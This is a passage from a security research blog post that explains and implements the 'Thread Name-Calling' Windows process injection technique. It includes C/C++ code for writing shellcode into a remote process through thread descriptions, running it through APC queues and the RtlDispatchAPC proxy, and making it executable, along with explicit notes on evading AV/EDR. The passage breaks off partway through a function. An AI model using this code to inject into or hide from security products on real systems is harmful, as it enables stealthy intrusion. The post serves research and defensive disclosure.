This function initializes UNICODE\_STRING basing on a dummy buffer of a required length, and then fills it with the actual content (which may contain NULL bytes). Then, the prepared structure is passed to the thread using the low-level API: `NtSetInformationThread`.

### NtQueueApcThreadEx2

In the implementation of our injection technique, we rely on calling some APIs remotely within the target process.

Windows supports adding routines to [Asynchronous Procedure Call (APC)](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) queue of existing threads, giving the ability to run code in a remote process without the need to create an additional thread. At a low level, this functionality is exposed by the function: [`NtQueueApcThreadEx`](https://ntdoc.m417z.com/ntqueueapcthreadex)(and its wrapper: [`NtQueueApcThread`](https://ntdoc.m417z.com/ntqueueapcthread)). The official, higher-level API recommended by Microsoft is [`QueueUserAPC`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) – which works as a wrapper for the lower-level function. We are free to add APC to a remote thread, as long as its handle is opened with `THREAD_SET_CONTEXT` access.

The related APIs have often been misused in [variety of different (old and new) injection techniques](https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf), and are [described in the MITRE database](https://attack.mitre.org/techniques/T1055/004/). APC allows for running remote code by hopping onboard an existing thread, and that is stealthier than the common alternative of creating a remote thread. Creating a new thread triggers a kernel callback ( [`PsSetCreateThreadNotifyRoutine`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine)/ [`Ex`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex) **)**, often used by kernel-mode components of AV / EDR products for detection.

In addition, APC gives us more freedom in passing parameters to the remote function. In case of a new thread creation, we can pass only one argument – and here we are allowed to use 3.

However, using the plain [NtQueueApcThread](https://ntdoc.m417z.com/ntqueueapcthread) has a drawback. To add our function to the APC queue, we need to first find the thread that is in an alertable state (waiting for a signal). Our callback is executed only when the thread is alerted. Details on how to approach this obstacle are explained i.e. in the [blog post by _modexp_](https://modexp.wordpress.com/2019/08/27/process-injection-apc/). Relying on alertable threads limits our choices for the targets, and scanning for them adds some complexity to the injector.

Fortunately, a workaround to this problem appeared since the new types of APC callbacks have been introduced on Windows. They are defined by [`QUEUE_USER_APC_FLAGS`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags) . Since the introduction of this type, the argument `ReserveHandle` in [`NtQueueApcThreadEx`](https://ntdoc.m417z.com/ntqueueapcthreadex) was replaced with `UserApcOption` where we can pass such a flag, modifying the function’s behavior. The most interesting from our perspective is Special User APC ( `QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC`) that allows us to inject into threads that are not necessarily in the alertable state:

> _**Quote [from MSDN](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc2):**_
>
> _Special user-mode APCs always execute, even if the target thread is not in an alertable state. For example, if the target thread is currently executing user-mode code, or if the target thread is currently performing an alertable wait, the target thread will be interrupted immediately for APC execution. If the target thread is executing a system call, or performing a non-alertable wait, the APC will be executed after the system call or non-alertable wait finishes (the wait is not interrupted)._

Note that the potential of the new API for improving injection methods, was already noticed by researchers, and is described, i. e. in [this blog by _repnz_](https://repnz.github.io/posts/apc/user-apc/).

This new APC type has also been criticized for the associated risk of introducing stability issues in the application and making it harder to synchronize the threads (i.e. [here](https://www.codeproject.com/Articles/5355373/Understanding-Windows-Asynchronous-Procedure-Calls)). However, it should not be a big problem in our case, as we are using it to run a code that is completely independent from the running application and does not use any resources that should create concurrency issues.

The new API supporting the added APC types was officially added in Windows 11 (Build 22000). It is exposed by the function: [`QueueUserAPC2`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc2), which, at the lower level, was implemented by a new version of the well-known `NtQueueApcThreadEx`. The new function is simply called `NtQueueApcThreadEx2` and has the following prototype ( [source](https://ntdoc.m417z.com/ntqueueapcthreadex2)):

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

NTSYSCALLAPI

NTSTATUS

NTAPI

NtQueueApcThreadEx2(

\_In\_ HANDLE ThreadHandle,

\_In\_opt\_ HANDLE ReserveHandle, // NtAllocateReserveObject

\_In\_ ULONG ApcFlags, // QUEUE\_USER\_APC\_FLAGS

\_In\_ PPS\_APC\_ROUTINE ApcRoutine,

\_In\_opt\_ PVOID ApcArgument1,

\_In\_opt\_ PVOID ApcArgument2,

\_In\_opt\_ PVOID ApcArgument3

);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueueApcThreadEx2(
\_In\_ HANDLE ThreadHandle,
\_In\_opt\_ HANDLE ReserveHandle, // NtAllocateReserveObject
\_In\_ ULONG ApcFlags, // QUEUE\_USER\_APC\_FLAGS
\_In\_ PPS\_APC\_ROUTINE ApcRoutine,
\_In\_opt\_ PVOID ApcArgument1,
\_In\_opt\_ PVOID ApcArgument2,
\_In\_opt\_ PVOID ApcArgument3
);

```
NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueueApcThreadEx2(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE ReserveHandle, // NtAllocateReserveObject
    _In_ ULONG ApcFlags, // QUEUE_USER_APC_FLAGS
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3
    );
```

It turns out, we can find this API on Windows 10, since build `19045` – which is earlier than the officially supported version.

As this is a relatively new API, associated with a new syscall, using it can also give an opportunity to bypass some of the products that are not yet watching it.

We use this API for a remote function execution in our implementation of Thread Name-Calling. Still, it is possible to implement a (less stealthy) variant of Thread Name-Calling, using the old API, which we will also demonstrate.

### RtlDispatchAPC

This function is not a requirement for our technique, but rather a helper that makes the shellcode execution a bit more stealthy.

Once the shellcode is successfully copied into the remote process, we need to run it. We decided to do it by adding its start address to the APC queue of the remote thread. However, since our shellcode is in a private memory rather than in any mapped module, passing its address directly may trigger some alerts. To evade this indicator it is beneficial to use some legitimate function as a proxy. There are multiple functions that allow to pass a callback to be executed. Many of them have been documented extensively [by Hexacorn in his blog](https://www.hexacorn.com/blog/2016/12/17/shellcode-ill-call-you-back/). Some interesting additions have been [noted by _modexp_ blog](https://modexp.wordpress.com/2024/02/13/delegated-nt-dll/).

The function `RtlDispatchAPC` looks like a perfect candidate. It has three arguments, so it is compatible with APC API. The implementation:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

void \_\_fastcall RtlDispatchAPC(void(\_\_fastcall \*callback)(\_\_int64), \_\_int64 callback\_arg, void \*a3)

{

\_\_int64 v6 = 72LL;

int v7 = 1;

\_\_int128 v8 = 0LL;

\_\_int128 v9 = 0LL;

\_\_int128 v10 = 0LL;

\_\_int64 v11 = 0LL;

if( a3 == (void \*)-1LL )

{

callback(callback\_arg);

}

else

{

RtlActivateActivationContextUnsafeFast(&v6, a3);

callback(callback\_arg);

RtlDeactivateActivationContextUnsafeFast(&v6);

RtlReleaseActivationContext(a3);

}

}

void \_\_fastcall RtlDispatchAPC(void (\_\_fastcall \*callback)(\_\_int64), \_\_int64 callback\_arg, void \*a3)
{
\_\_int64 v6 = 72LL;
int v7 = 1;
\_\_int128 v8 = 0LL;
\_\_int128 v9 = 0LL;
\_\_int128 v10 = 0LL;
\_\_int64 v11 = 0LL;

if ( a3 == (void \*)-1LL )
{
callback(callback\_arg);
}
else
{
RtlActivateActivationContextUnsafeFast(&v6, a3);
callback(callback\_arg);
RtlDeactivateActivationContextUnsafeFast(&v6);
RtlReleaseActivationContext(a3);
}
}

```
void __fastcall RtlDispatchAPC(void (__fastcall *callback)(__int64), __int64 callback_arg, void *a3)
{
  __int64 v6 = 72LL;
  int v7 = 1;
  __int128 v8 = 0LL;
  __int128 v9 = 0LL;
  __int128 v10 = 0LL;
  __int64 v11 = 0LL;

  if ( a3 == (void *)-1LL )
  {
    callback(callback_arg);
  }
  else
  {
    RtlActivateActivationContextUnsafeFast(&v6, a3);
    callback(callback_arg);
    RtlDeactivateActivationContextUnsafeFast(&v6);
    RtlReleaseActivationContext(a3);
  }
}
```

To make the above function execute our shellcode we need to pass it the following parameters:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

RtlDispatchAPC(shellcodePtr, 0, (void \*)(-1))

RtlDispatchAPC(shellcodePtr, 0, (void \*)(-1))

```
RtlDispatchAPC(shellcodePtr, 0, (void *)(-1))
```

Note that `RtlDispatchAPC` is not exported by name, but, on the tested versions of Windows, we could find it easily by Ordinal 8.

![Figure 1 - RtlDispatchAPC among symbols of NTDLL.DLL](https://research.checkpoint.com/wp-content/uploads/2024/07/TXYQKLGPF9-rId75.png)Figure 1 – RtlDispatchAPC among symbols of NTDLL.DLL

## Introducing Thread Name-Calling injection

Now that we have introduced all the important APIs, let’s dive into the implementation details of Thread Name-Calling. As already mentioned, it is a variant of a technique that allows us to inject a shellcode into a running process (in contrast to the techniques that operate on the process that needs to be freshly created).

### Minimal access rights

Typically, when we want to write a buffer into a process, we need to first open a handle to this process with a write access right ( [`PROCESS_VM_WRITE`](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) **)** – which may be treated as a suspicious indicator. Thread Name-Calling allows us to achieve the write, and remote allocation, without it.

The currently presented implementation requires opening the process handle with the following access rights:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

HANDLE open\_process(DWORD processId, bool isCreateThread)

{

DWORD access = PROCESS\_QUERY\_LIMITED\_INFORMATION // required for reading the PEB address

\| PROCESS\_VM\_READ // required for reading back the pointer to the created buffer

\| PROCESS\_VM\_OPERATION // to set memory area executable or/and allocate a new executable memory

;

if(isCreateThread){

access \|= PROCESS\_CREATE\_THREAD; // to create a new thread where we can pass APC

}

returnOpenProcess(access, FALSE, processId);

}

HANDLE open\_process(DWORD processId, bool isCreateThread)
{
DWORD access = PROCESS\_QUERY\_LIMITED\_INFORMATION // required for reading the PEB address
\| PROCESS\_VM\_READ // required for reading back the pointer to the created buffer
\| PROCESS\_VM\_OPERATION // to set memory area executable or/and allocate a new executable memory
;
if (isCreateThread) {
access \|= PROCESS\_CREATE\_THREAD; // to create a new thread where we can pass APC
}
return OpenProcess(access, FALSE, processId);
}

```
HANDLE open_process(DWORD processId, bool isCreateThread)
{
    DWORD access = PROCESS_QUERY_LIMITED_INFORMATION // required for reading the PEB address
        | PROCESS_VM_READ // required for reading back the pointer to the created buffer
        | PROCESS_VM_OPERATION // to set memory area executable or/and allocate a new executable memory
        ;
    if (isCreateThread) {
        access |= PROCESS_CREATE_THREAD; // to create a new thread where we can pass APC
    }
    return OpenProcess(access, FALSE, processId);
}
```

Depending on our needs, Thread Name-Calling can be implemented in different flavors. In the most stealthy (recommended) variant, we do the remote calls using routines added to the APC queue of an existing thread. However, if we want to run it on older versions of Windows, where the new API for APC is not available, and we can’t find alertable threads in our desired target, we may create an additional thread. In such case, the relevant access right needs to be set on our process handle:

- `PROCESS_CREATE_THREAD`

Keep in mind that this change increases the detection ratio of the technique. However, we found some products where it was enough for the bypass.

Generally, it is a good practice to minimize the used access rights. Of the ones listed above, we can still avoid using some of them by further refining the implementation. For example:

- `PROCESS_QUERY_LIMITED_INFORMATION` – can be avoided if we don’t use PEB for the pointer storage (details explained later)

During the injection, we operate on threads of our target process. Regarding the thread handle, these are the minimal required [access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights):

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

DWORD thAccess = SYNCHRONIZE;

thAccess \|= THREAD\_SET\_CONTEXT; // required for adding to the APC queue

thAccess \|= THREAD\_SET\_LIMITED\_INFORMATION; // required for setting thread description

DWORD thAccess = SYNCHRONIZE;
thAccess \|= THREAD\_SET\_CONTEXT; // required for adding to the APC queue
thAccess \|= THREAD\_SET\_LIMITED\_INFORMATION; // required for setting thread description

```
    DWORD thAccess = SYNCHRONIZE;
    thAccess |= THREAD_SET_CONTEXT; // required for adding to the APC queue
    thAccess |= THREAD_SET_LIMITED_INFORMATION; // required for setting thread description
```

## Implementation

As is always the case of with remote shellcode injection, the implementation must cover:

- writing our buffer into the remote process’ working set
- making it executable
- running the implanted code

### Remote write with the help of thread description

Let’s have a look at the details of how the remote allocation, along with remote writing, can be implemented with the help of the APIs mentioned earlier.

- As we are implementing code injection, we must start by preparing a proper shellcode. Since we got rid of the NULL byte constraint, we only need to ensure that our shellcode will not be blocking the thread it runs on, and that it has a clean exit.
- From our injector application, we need to select a thread within the target, where we can set a thread description containing our shellcode. If we use the new API with Special User APC, we can pick just any thread, but if we use the old API – we must ensure that the selected thread is alertable.
- Next, the thread description must be retrieved within the context of the remote process, so that the buffer will be read into the [process’ working set](https://learn.microsoft.com/pl-pl/windows/win32/procthread/process-working-set). This can be achieved by a remote call of the function:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

HRESULT GetThreadDescription(

\[in\] HANDLE hThread,

\[out\] PWSTR \*ppszThreadDescription // <\- we get back the pointer to allocated buffer

);

HRESULT GetThreadDescription(
\[in\] HANDLE hThread,
\[out\] PWSTR \*ppszThreadDescription // <- we get back the pointer to allocated buffer
);

```
HRESULT GetThreadDescription(
  [in]  HANDLE hThread,
  [out] PWSTR  *ppszThreadDescription // <- we get back the pointer to allocated buffer
);
```

Remember that the above function automatically allocates a buffer of a required size on the heap, and then fills it in with the thread description. This gives us the remote write primitive together with remote allocation of a buffer with Read/Write access. The pointer to this new buffer will be filled into the supplied variable `ppszThreadDescription`.

Therefore, we need to prepare in advance a memory address within the remote process that can be used as `*ppszThreadDescription`. It must be an area of a pointer size where the called function `GetThreadDescription` can write back. There are various options to approach it:

1. find some tiny cave in a writable memory of the remote process
2. utilize some unused fields in a PEB of the remote process

We decided to utilize an unused field in a PEB because it is very easy to find and retrieve, but we can later replace it with a cave if needed.

By checking [fields in the PEB](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpebteb.h) we can find the following:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

\[...\]

PVOID SparePointers\[2\]; // 19H1 (previously FlsCallback to FlsHighIndex)

PVOID PatchLoaderData;

PVOID ChpeV2ProcessInfo; // \_CHPEV2\_PROCESS\_INFO

ULONG AppModelFeatureState;

ULONG SpareUlongs\[2\]; // ---\> unused field, can be utilized to store our pointer

USHORT ActiveCodePage;

USHORT OemCodePage;

USHORT UseCaseMapping;

USHORT UnusedNlsField;

PVOID WerRegistrationData;

PVOID WerShipAssertPtr;

union

{

PVOID pContextData; // WIN7

PVOID pUnused; // WIN10

PVOID EcCodeBitMap; // WIN11

};

\[...\]

\[...\]
PVOID SparePointers\[2\]; // 19H1 (previously FlsCallback to FlsHighIndex)
PVOID PatchLoaderData;
PVOID ChpeV2ProcessInfo; // \_CHPEV2\_PROCESS\_INFO

ULONG AppModelFeatureState;
ULONG SpareUlongs\[2\]; // ---> unused field, can be utilized to store our pointer

USHORT ActiveCodePage;
USHORT OemCodePage;
USHORT UseCaseMapping;
USHORT UnusedNlsField;

PVOID WerRegistrationData;
PVOID WerShipAssertPtr;

union
{
PVOID pContextData; // WIN7
PVOID pUnused; // WIN10
PVOID EcCodeBitMap; // WIN11
};
\[...\]

```
    [...]
    PVOID SparePointers[2]; // 19H1 (previously FlsCallback to FlsHighIndex)
    PVOID PatchLoaderData;
    PVOID ChpeV2ProcessInfo; // _CHPEV2_PROCESS_INFO

    ULONG AppModelFeatureState;
    ULONG SpareUlongs[2]; // ---> unused field, can be utilized to store our pointer

    USHORT ActiveCodePage;
    USHORT OemCodePage;
    USHORT UseCaseMapping;
    USHORT UnusedNlsField;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;

    union
    {
        PVOID pContextData; // WIN7
        PVOID pUnused; // WIN10
        PVOID EcCodeBitMap; // WIN11
    };
    [...]
```

The field `SpareUlongs` looks like a good candidate. We can retrieve its exact offset by dumping the PEB with WinDbg:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

lkd> dt nt!\_PEB

\[...\]

+0x340 SpareUlongs :\[5\] Uint4B

\[...\]

lkd> dt nt!\_PEB
\[...\]
+0x340 SpareUlongs : \[5\] Uint4B
\[...\]

```
lkd> dt nt!_PEB
   [...]
   +0x340 SpareUlongs      : [5] Uint4B
   [...]
```

PEB has read/write access, so by finding an unused field of a pointer size, we have the suitable storage where the remotely called function can write back. Keep in mind, that in the future versions of Windows, those fields may be utilized for some system data structures, so this solution must be adjusted accordingly to the updates.

First, we retrieve the address of the remote PEB – we can do it by calling the API `NtQuerySystemInformationProcess` :

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

// the function getting the remote PEB address:

ULONG\_PTR remote\_peb\_addr(IN HANDLE hProcess)

{

PROCESS\_BASIC\_INFORMATION pi = { 0 };

DWORD ReturnLength = 0;

auto pNtQueryInformationProcess = reinterpret\_cast<decltype(&NtQueryInformationProcess)>(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess"));

if(!pNtQueryInformationProcess){

returnNULL;

}

NTSTATUS status = pNtQueryInformationProcess(

hProcess,

ProcessBasicInformation,

&pi,

sizeof(PROCESS\_BASIC\_INFORMATION),

&ReturnLength

);

if(status != STATUS\_SUCCESS){

std::cerr <<"NtQueryInformationProcess failed"<< std::endl;

returnNULL;

}

return(ULONG\_PTR)pi.PebBaseAddress;

}

// the function getting the remote PEB address:
ULONG\_PTR remote\_peb\_addr(IN HANDLE hProcess)
{
PROCESS\_BASIC\_INFORMATION pi = { 0 };
DWORD ReturnLength = 0;

auto pNtQueryInformationProcess = reinterpret\_cast<decltype(&NtQueryInformationProcess)>(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess"));
if (!pNtQueryInformationProcess) {
return NULL;
}
NTSTATUS status = pNtQueryInformationProcess(
hProcess,
ProcessBasicInformation,
&pi,
sizeof(PROCESS\_BASIC\_INFORMATION),
&ReturnLength
);
if (status != STATUS\_SUCCESS) {
std::cerr << "NtQueryInformationProcess failed" << std::endl;
return NULL;
}
return (ULONG\_PTR)pi.PebBaseAddress;
}

```
// the function getting the remote PEB address:
ULONG_PTR remote_peb_addr(IN HANDLE hProcess)
{
    PROCESS_BASIC_INFORMATION pi = { 0 };
    DWORD ReturnLength = 0;

    auto pNtQueryInformationProcess = reinterpret_cast<decltype(&NtQueryInformationProcess)>(GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess"));
    if (!pNtQueryInformationProcess) {
        return NULL;
    }
    NTSTATUS status = pNtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed" << std::endl;
        return NULL;
    }
    return (ULONG_PTR)pi.PebBaseAddress;
}
```

Having the base address of the PEB, it is enough to add the known offset of the unused field, to get its pointer in the context of the remote process:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

ULONG\_PTR get\_peb\_unused(HANDLE hProcess)

{

ULONG\_PTR peb\_addr = remote\_peb\_addr(hProcess);

if(!peb\_addr){

std::cerr <<"Cannot retrieve PEB address!\\n";

returnNULL;

}

const ULONG\_PTR UNUSED\_OFFSET = 0x340;

const ULONG\_PTR remotePtr = peb\_addr + UNUSED\_OFFSET;

return remotePtr;

}

ULONG\_PTR get\_peb\_unused(HANDLE hProcess)
{
ULONG\_PTR peb\_addr = remote\_peb\_addr(hProcess);
if (!peb\_addr) {
std::cerr << "Cannot retrieve PEB address!\\n";
return NULL;
}
const ULONG\_PTR UNUSED\_OFFSET = 0x340;
const ULONG\_PTR remotePtr = peb\_addr + UNUSED\_OFFSET;
return remotePtr;
}

```
ULONG_PTR get_peb_unused(HANDLE hProcess)
{
    ULONG_PTR peb_addr = remote_peb_addr(hProcess);
    if (!peb_addr) {
        std::cerr << "Cannot retrieve PEB address!\n";
        return NULL;
    }
    const ULONG_PTR UNUSED_OFFSET = 0x340;
    const ULONG_PTR remotePtr = peb_addr + UNUSED_OFFSET;
    return remotePtr;
}
```

As for setting the thread description (a. k. a. name) – we can do it either:

1. on an existing thread
2. on a new one, that we just create for this purpose

The name will be retrieved by passing an APC with the function `GetThreadDescription` to the same thread where it was set (since this function has 2 parameters, and calling via APC we can pass up to 3 parameters, it is a good fit).

> _**Side note:**_
>
> _The function `GetThreadDescription` requires us to pass the handle to the thread which description (name) we want to read. We CAN set the name on a different thread than the one reading it back. But keep in mind that this function will be executed in context of the target process. Therefore, the handle to the thread that we opened in context of the injector process is no longer valid. Using it in context of a different process would require us to [duplicate the handle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle) of the named thread. That means, we must extend our access to the target process by setting `PROCESS_DUP_HANDLE`, so it’s best to avoid it. The alternative scenario is much easier: because we retrieve the name by the named thread itself, it is enough to use the pseudo handle `NtCurrentThread()`= (-2) , which is always valid while referencing to the current thread by self._

In the first (preferable) scenario, if we utilize the threads already running within the process, we should either:

- use the new API for APC, and add our function as the Special User APC (`QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC`)
- find a thread in an alterable state, so that our function can be called when the thread gets alerted

The thread must be open with (at least) `THREAD_SET_CONTEXT | THREAD_SET_LIMITED_INFORMATION` access.

In the second scenario, with a newly created thread, if we use it in conjunction with the old API, we also have to ensure that the thread is alertable, so that our APC gets executed. Examples on how to do it:

- create a [suspended thread on a benign function](https://github.com/hasherezade/thread_namecalling/blob/14fcde84ffdbfabe5ee93b5233e5259299f7289d/common.cpp#L109) (i.e. `Sleep`, `ExitThread` from kernel32), [add the needed function to the APC queue](https://github.com/hasherezade/thread_namecalling/blob/14fcde84ffdbfabe5ee93b5233e5259299f7289d/common.cpp#L183), then resume it
- create a thread on the [`SleepEx` function](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex). This function requires two arguments, the second one defining if the Sleep is alertable. Using the thread creation function we can pass only one argument – this sounds like a problem. Yet, the second needed argument is boolean, which means, any non-zero value is treated as TRUE. In the [x64 calling convention the second argument is passed via RDX register](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170), so if the RDX register, at the point of calling, holds anything different than zero, our `SleepEx` will be treated as alertable. That means, with a high probability the needed value is already set.

Any other steps can be done only after our APC gets called. Before that, we don’t have our buffer in the remote process yet, and we also don’t know at what address it would be stored. Therefore, in order to pass the buffer, we need the first APC. And after it is completed and the buffer is written, we need the second APC to be able to run it.

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

wchar\_t\* pass\_via\_thread\_name(HANDLE hProcess, const wchar\_t\* buf, constvoid\\* remotePtr)

{

if(!remotePtr){

std::cerr <<"Return pointer not set!\\n";

returnnullptr;

}

HANDLE hThread = find\_thread(hProcess, THREAD\_SET\_CONTEXT \| THREAD\_SET\_LIMITED\_INFORMATION);

if(!hThread \|\| hThread == INVALID\_HANDLE\_VALUE){

std::cerr <<"Invalid thread handle!\\n";

returnnullptr;

}

HRESULT hr = mySetThreadDescription(hThread, buf); // customized SetThreadDescription allows to pass a buffer with NULL bytes

if(FAILED(hr)){

std::cout <<"Failed to set thread desc"<< std::endl;

returnnullptr;

}

if(!queue\_apc\_thread(hThread, GetThreadDescription, (void\*)NtCurrentThread(), (void\*)remotePtr, 0)){

CloseHandle(hThread);

returnnullptr;

}

// close thread handle

CloseHandle(hThread);

wchar\_t\* wPtr = nullptr;

bool isRead = false;

while((wPtr = (wchar\_t\*)read\_remote\_ptr(hProcess, remotePtr, isRead)) == nullptr){

if(!isRead)returnnullptr;

Sleep(1000); // waiting for the pointer to be written;

}

std::cout <<"Written to the Thread\\n";

return wPtr;

}

wchar\_t\* pass\_via\_thread\_name(HANDLE hProcess, const wchar\_t\* buf, const void\* remotePtr)
{
if (!remotePtr) {
std::cerr << "Return pointer not set!\\n";
return nullptr;
}

HANDLE hThread = find\_thread(hProcess, THREAD\_SET\_CONTEXT \| THREAD\_SET\_LIMITED\_INFORMATION);

if (!hThread \|\| hThread == INVALID\_HANDLE\_VALUE) {
std::cerr << "Invalid thread handle!\\n";
return nullptr;
}

HRESULT hr = mySetThreadDescription(hThread, buf); // customized SetThreadDescription allows to pass a buffer with NULL bytes
if (FAILED(hr)) {
std::cout << "Failed to set thread desc" << std::endl;
return nullptr;
}
if (!queue\_apc\_thread(hThread, GetThreadDescription, (void\*)NtCurrentThread(), (void\*)remotePtr, 0)) {
CloseHandle(hThread);
return nullptr;
}
// close thread handle
CloseHandle(hThread);

wchar\_t\* wPtr = nullptr;
bool isRead = false;
while ((wPtr = (wchar\_t\*)read\_remote\_ptr(hProcess, remotePtr, isRead)) == nullptr) {
if (!isRead) return nullptr;
Sleep(1000); // waiting for the pointer to be written;
}
std::cout << "Written to the Thread\\n";
return wPtr;
}

```
wchar_t* pass_via_thread_name(HANDLE hProcess, const wchar_t* buf, const void* remotePtr)
{
    if (!remotePtr) {
        std::cerr << "Return pointer not set!\n";
        return nullptr;
    }

    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT | THREAD_SET_LIMITED_INFORMATION);

    if (!hThread || hThread == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid thread handle!\n";
        return nullptr;
    }

    HRESULT hr = mySetThreadDescription(hThread, buf); // customized SetThreadDescription allows to pass a buffer with NULL bytes
    if (FAILED(hr)) {
        std::cout << "Failed to set thread desc" << std::endl;
        return nullptr;
    }
    if (!queue_apc_thread(hThread, GetThreadDescription, (void*)NtCurrentThread(), (void*)remotePtr, 0)) {
        CloseHandle(hThread);
        return nullptr;
    }
    // close thread handle
    CloseHandle(hThread);

    wchar_t* wPtr = nullptr;
    bool isRead = false;
    while ((wPtr = (wchar_t*)read_remote_ptr(hProcess, remotePtr, isRead)) == nullptr) {
        if (!isRead) return nullptr;
        Sleep(1000); // waiting for the pointer to be written;
    }
    std::cout << "Written to the Thread\n";
    return wPtr;
}
```

After the above function finishes, we have our buffer written to the remote process. We also have a pointer to it. That means, the remote write is accomplished.

![](https://research.checkpoint.com/wp-content/uploads/2024/07/animation3-1.gif)Figure 2 – Remote write with the help of Thread Name

At this point our payload is already stored in the working set of the remote process. However, it is in a non-executable memory, allocated on the heap.

To proceed, we need to do one of these:

- find an empty cave in executable memory, and copy it there (the most stealthy option, unfortunately, finding a fitting cave is unlikely in practice)
- allocate a new, executable buffer of a fitting size, and copy it there
- set on the whole page containing it Read-Write-eXecute (RWX) access rights (we cannot just make it RX: remember that it is a page used for Heap, and there is some other stuff stored along with our buffer)

Copying our buffer from the heap into a different memory region can be achieved via APC, by calling the function `RtlMoveMemory` from `ntdll`, which has 3 arguments. However, obtaining the executable buffer is more problematic.

None of the proposed solutions is perfect, but they may be sufficient depending on the scenario.

Allocating a new buffer is the cleanest option, but it has some drawbacks. To do it from a remote process, we must call [`VirtualAllocEx`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) with RWX access – which is suspicious. Calling `VirtualAlloc` remotely via APC is impossible: this function has 4 arguments, and with the API for APC we can only pass 3.

An alternative is to use the buffer that we already have (allocated on the heap), and just change its memory protection. We can do it by calling [`VirtualProtectEx`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex). Changing the memory protection of the page within the remote process is still suspicious, but the advantage of this method is that it requires fewer steps than the one presented earlier. Again, calling the local equivalent of the function: `VirtualProtect` remotely has the same problems as calling `VirtualAlloc`.

Still, there exists a possibility to do the memory protection or allocation by calling `VirtualAlloc`/`VirtualProtect` remotely with the help of ROP (included as one of the options in [our PoC code](https://github.com/hasherezade/thread_namecalling)). But this method comes with its own problems, and a different set of suspicious indicators. It requires using API for direct thread manipulation (`SuspendThread`/`ResumeThread`, `SetThreadContext`/`GetThreadContext`). According to the tests we performed, that raises even more alerts, and will result in our injector being flagged by many AV/EDR products. In addition, allocating executable memory from within the process will fail if it has the [DCP (Dynamic Code Prohibited) enabled](https://www.ired.team/offensive-security/defense-evasion/acg-arbitrary-code-guard-processdynamiccodepolicy).

After considering all the pros and cons, we decided to keep things simple and just call [`VirtualProtectEx`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex). The second snippet illustrates the alternative version, with `VirtualAllocEx`.

Once our shellcode is in the executable memory region, we are ready to run it. We use another APC to trigger the execution (requires a thread handle with `THREAD_SET_CONTEXT` access). Additionally, we may use aforementioned function, `RtlDispatchAPC`, as a proxy to call the injected code.

Snippet illustrating the basic implementation:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

boolrun\_injected\_v1(HANDLE hProcess, void\\* remotePtr, size\_t payload\_len)

{

DWORD oldProtect = 0;

if(!VirtualProtectEx(hProcess, remotePtr, payload\_len, PAGE\_EXECUTE\_READWRITE, &oldProtect)){

std::cout <<"Failed to protect!"<< std::hex <<GetLastError()<<"\\n";

returnfalse;

}

HANDLE hThread = find\_thread(hProcess, THREAD\_SET\_CONTEXT);

if(!hThread \|\| hThread == INVALID\_HANDLE\_VALUE){

std::cerr <<"Invalid thread handle!\\n";

returnfalse;

}

bool isOk = false;

auto \_RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;

if(\_RtlDispatchAPC){

if(queue\_apc\_thread(hThread, \_RtlDispatchAPC, shellcodePtr, 0, (void\*)(-1))){

isOk = true;

}

}

CloseHandle(hThread);

